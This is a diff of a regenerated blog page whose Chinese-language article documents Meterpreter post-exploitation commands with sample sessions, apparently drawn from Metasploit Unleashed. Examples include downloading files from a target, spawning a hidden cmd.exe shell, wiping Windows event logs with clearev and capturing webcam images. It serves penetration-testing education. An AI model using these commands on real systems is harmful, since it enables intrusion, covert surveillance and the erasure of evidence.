@@ -1,94 +1,58 @@
 <!DOCTYPE html>
-
-
-
-
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
   <link rel="manifest" href="/images/manifest.json">
 
-<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+<link rel="stylesheet" href="/css/main.css">
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '7.4.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":true,"show_result":true,"style":"mac"},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Copy',
-      copy_success: 'Copied',
-      copy_failure: 'Copy failed'
-    },
-    sidebarPadding: 40
-  };
-</script>
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"spwpun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
 
-  <meta name="description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
-<meta name="keywords" content="meterpreter,Penetration">
+  <meta name="description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。 HELP展示帮助菜单： 1234567891011meterpreter &gt; helpCore Commands&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    Command       Description    -------       -----------    ?             Help menu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="meterpreter常用命令">
-<meta property="og:url" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/index.html">
+<meta property="og:url" content="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
 <meta property="og:site_name" content="Spwpun&#39;s Blog">
-<meta property="og:description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png">
-<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_after.png">
-<meta property="og:updated_time" content="2019-12-29T17:10:46.072Z">
+<meta property="og:description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。 HELP展示帮助菜单： 1234567891011meterpreter &gt; helpCore Commands&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    Command       Description    -------       -----------    ?             Help menu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_before.png">
+<meta property="og:image" content="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_after.png">
+<meta property="article:published_time" content="2019-12-29T10:22:56.000Z">
+<meta property="article:modified_time" content="2019-12-29T17:10:46.072Z">
+<meta property="article:author" content="Demen Lee">
+<meta property="article:tag" content="meterpreter">
+<meta property="article:tag" content="Penetration">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="meterpreter常用命令">
-<meta name="twitter:description" content="METERPRETER命令用法所有的命令都会涉及到，若没有，实践是检验的唯一标准。HELP展示帮助菜单：">
-<meta name="twitter:image" content="https://spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png">
-  <link rel="canonical" href="https://spwpun.github.io/2019/12/29/meterpreter常用命令/">
+<meta name="twitter:image" content="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_before.png">
+
+<link rel="canonical" href="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
   };
 </script>
 
   <title>meterpreter常用命令 | Spwpun's Blog</title>
   
-
-
 
 
 
@@ -107,7 +71,6 @@
   .use-motion .post-body,
   .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
   .use-motion .site-title,
   .use-motion .site-subtitle {
     opacity: initial;
@@ -125,19 +88,8 @@
   <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Spwpun's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="Toggle navigation bar">
       <span class="toggle-line toggle-line-first"></span>
@@ -145,97 +97,86 @@
       <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spwpun's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
 </div>
 
 
+
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-      
-    
 
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-about">
-      
-    
 
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-tags">
-      
-    
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-categories">
-      
-    
 
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-archives">
-      
-    
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
 
   </li>
       <li class="menu-item menu-item-search">
-        <a href="javascript:;" class="popup-trigger">
-        
-          <i class="fa fa-search fa-fw"></i>Search</a>
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
       </li>
-    
   </ul>
-
 </nav>
-  <div class="site-search">
+
+
+
+  <div class="search-pop-overlay">
     <div class="popup search-popup">
-    <div class="search-header">
+        <div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+    <input autocomplete="off" autocapitalize="off"
            placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
+           type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
   </div>
+</div>
+
+    </div>
+  </div>
+
 </div>
     </header>
 
@@ -248,96 +189,86 @@
   <a href="https://github.com/spwpun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
 
 
-    <main id="main" class="main">
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
             
 
-          <div id="content" class="content">
-            
-
-  <div class="posts-expand">
-      
+    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/29/meterpreter常用命令/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">meterpreter常用命令
-
-          
+        <h1 class="post-title" itemprop="name headline">
+          meterpreter常用命令
         </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2019-12-29 18:22:56" itemprop="dateCreated datePublished" datetime="2019-12-29T18:22:56+08:00">2019-12-29</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2019-12-30 01:10:46" itemprop="dateModified" datetime="2019-12-30T01:10:46+08:00">2019-12-30</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/工具使用/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2019/12/29/meterpreter常用命令/" class="post-meta-item leancloud_visitors" data-flag-title="meterpreter常用命令" title="Views">
+            <span id="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-meta-item leancloud_visitors" data-flag-title="meterpreter常用命令" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2019/12/29/meterpreter常用命令/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/12/29/meterpreter常用命令/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -351,15 +282,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="METERPRETER命令用法"><a href="#METERPRETER命令用法" class="headerlink" title="METERPRETER命令用法"></a>METERPRETER命令用法</h2><p>所有的命令都会涉及到，若没有，实践是检验的唯一标准。</p><h2 id="HELP"><a href="#HELP" class="headerlink" title="HELP"></a>HELP</h2><p>展示帮助菜单：</p><a id="more"></a>
-
+        <h2 id="METERPRETER命令用法"><a href="#METERPRETER命令用法" class="headerlink" title="METERPRETER命令用法"></a>METERPRETER命令用法</h2><p>所有的命令都会涉及到，若没有，实践是检验的唯一标准。</p>
+<h2 id="HELP"><a href="#HELP" class="headerlink" title="HELP"></a>HELP</h2><p>展示帮助菜单：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>
 
 <h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><p>把当前session放到后台，然后返回‘msf’提示的命令行，如果要返回session，使用sessions命令选择：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="CAT"><a href="#CAT" class="headerlink" title="CAT"></a>CAT</h2><p>查看文件内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat</span><br><span class="line">Usage: cat file</span><br><span class="line"></span><br><span class="line">Example usage:</span><br><span class="line">meterpreter &gt; cat edit.txt</span><br><span class="line">What you talkin<span class="string">' about Willis</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat</span><br><span class="line">Usage: cat file</span><br><span class="line"></span><br><span class="line">Example usage:</span><br><span class="line">meterpreter &gt; cat edit.txt</span><br><span class="line">What you talkin<span class="string">&#x27; about Willis</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="CD-AND-PWD"><a href="#CD-AND-PWD" class="headerlink" title="CD AND PWD"></a>CD AND PWD</h2><p>切换目录，查看当前目录：</p>
 <p>参数:</p>
@@ -375,12 +306,12 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> c:\windows</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="CLEAREV-1"><a href="#CLEAREV-1" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>The <strong>clearev</strong> command will clear the <em>Application</em>, <em>System</em>, and <em>Security</em> logs on a <em>Windows</em> system. There are no options or arguments.</p>
-<p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_before.png" target="_blank" rel="noopener"><img src="//spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_before.png" alt="Before using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
+<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_before.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_before.png" alt="Before using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
 <p>上面是没有使用<strong>clearev</strong>命令清除前。</p>
 <p>用法:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 97 records from Application...</span><br><span class="line">[*] Wiping 415 records from System...</span><br><span class="line">[*] Wiping 0 records from Security...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_after.png" target="_blank" rel="noopener"><img src="//spwpun.github.io/2019/12/29/meterpreter常用命令/Clearev_after.png" alt="After using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
+<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_after.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_after.png" alt="After using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
 <p>上图是清除后的Windows系统日志。</p>
 <h2 id="DOWNLOAD"><a href="#DOWNLOAD" class="headerlink" title="DOWNLOAD"></a>DOWNLOAD</h2><p>从目标机上下载文件，注意路径需要使用两个反斜杠：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download c:\\boot.ini</span><br><span class="line">[*] downloading: c:\boot.ini -&gt; c:\boot.ini</span><br><span class="line">[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
@@ -389,7 +320,7 @@
 <p>示例:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">.</span><br><span class="line">...snip...</span><br><span class="line">.</span><br><span class="line">100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; edit edit.txt</span><br></pre></td></tr></table></figure>
 
-<p>查看更高级的用法.<a href="http://www.vim.org/" target="_blank" rel="noopener">http://www.vim.org/</a></p>
+<p>查看更高级的用法.<a target="_blank" rel="noopener" href="http://www.vim.org/">http://www.vim.org/</a></p>
 <h2 id="EXECUTE"><a href="#EXECUTE" class="headerlink" title="EXECUTE"></a>EXECUTE</h2><p>在目标机器上执行命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br><span class="line">Process 38320 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
 
@@ -453,56 +384,39 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: Creative WebCam NX Pro</span><br><span class="line">2: Creative WebCam NX Pro (VFW)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="WEBCAM-SNAP"><a href="#WEBCAM-SNAP" class="headerlink" title="WEBCAM_SNAP"></a>WEBCAM_SNAP</h2><p>利用已连接的webcam设备在目标机上截屏并以随机文件名的jpg格式保存在本地当前工作目录。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -h</span><br><span class="line">Usage: webcam_snap [options]</span><br><span class="line">Grab a frame from the specified webcam.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h      Help Banner</span><br><span class="line">    -i   要使用的webcam设备的编号(Default: 1)</span><br><span class="line">    -p   jpg图片的路径 (Default: <span class="string">'gnFjTnzi.jpeg'</span>)</span><br><span class="line">    -q   jpg图片的质量 (Default: <span class="string">'50'</span>)</span><br><span class="line">    -v   是否自动查看图片 (Default: <span class="string">'true'</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -h</span><br><span class="line">Usage: webcam_snap [options]</span><br><span class="line">Grab a frame from the specified webcam.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h      Help Banner</span><br><span class="line">    -i   要使用的webcam设备的编号(Default: 1)</span><br><span class="line">    -p   jpg图片的路径 (Default: <span class="string">&#x27;gnFjTnzi.jpeg&#x27;</span>)</span><br><span class="line">    -q   jpg图片的质量 (Default: <span class="string">&#x27;50&#x27;</span>)</span><br><span class="line">    -v   是否自动查看图片 (Default: <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>选项:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-h:	Displays the help information for the command</span><br><span class="line">-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the</span><br><span class="line">        image from</span><br><span class="line">-p opt:	Change path and filename of the image to be saved</span><br><span class="line">-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality</span><br><span class="line">-v opt:	By default the value is true, which opens the image after capture.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-h:	Displays the help information for the command</span><br><span class="line">-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the</span><br><span class="line">        image from</span><br><span class="line">-p opt:	Change path and filename of the image to be saved</span><br><span class="line">-q opt:	The imagine quality, 50 being the default&#x2F;medium setting, 100 being best quality</span><br><span class="line">-v opt:	By default the value is true, which opens the image after capture.</span><br></pre></td></tr></table></figure>
 
 <p>示例:</p>
